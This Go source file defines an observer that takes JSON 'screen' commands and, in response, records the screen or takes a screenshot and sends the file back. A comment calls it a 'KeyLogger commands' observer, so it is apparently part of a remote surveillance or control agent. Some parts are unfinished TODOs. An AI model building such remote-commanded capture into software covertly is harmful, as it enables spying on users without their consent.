package internal

import (
	"encoding/json"
	"log"
)

// KeyLogger commands Observer
type ScreenshotCmdObserver struct {
	recorder         *ScreenRecorder
	recordingChannel chan *Screenshot
	sendShotCmd      *SendFileCommand
}

func (o *ScreenshotCmdObserver) execute(string_json string) {
	var req ScreenRequest
	err := json.Unmarshal([]byte(string_json), &req)

	if err != nil {
		log.Println("Not a screen parse request")
		return
	}

	if req.Cmd != "screen" {
		return
	}

	log.Println("ScreenshotCmdObserver: command received:", string_json)

	switch req.Action {
	// Recording screen operations
	case "record":

		switch req.Action_status {
		case "start":
			seconds := req.Seconds

			// TODO: implement recording by number of seconds requested
			_ = seconds

			// Starts recording in a folder
			o.startRecording()
			return

		case "stop":
			// Stops recording
			o.stopRecording()
			return
		}

		break

	// Take only one shot
	case "screenshot":
		o.shot()
		break
	}
}

func (o *ScreenshotCmdObserver) startRecording() {
	o.recordingChannel = make(chan *Screenshot)

	go func() {
		o.recorder.StartCapturing(o.recordingChannel)

		for {
			shot := <-o.recordingChannel
			log.Printf("SHOT (%s)%s - %s \n", shot.FileGroup, shot.FileName, shot.FilePath)
		}
	}()
}

func (o *ScreenshotCmdObserver) stopRecording() {
	o.recorder.StopCapturing()
}

func (o *ScreenshotCmdObserver) shot() {
	// Set 'tmp' as group for the folder
	shot := o.recorder.ScreenShot("tmp")
	filepath := shot.FilePath
	_ = filepath

	// TODO: send the file back
	o.sendShotCmd.Send(filepath)
}

func NewScreenshotCmdObserver(recorder *ScreenRecorder, sendShotCmd *SendFileCommand) *ScreenshotCmdObserver {
	return &ScreenshotCmdObserver{
		recorder:    recorder,
		sendShotCmd: sendShotCmd,
	}
}
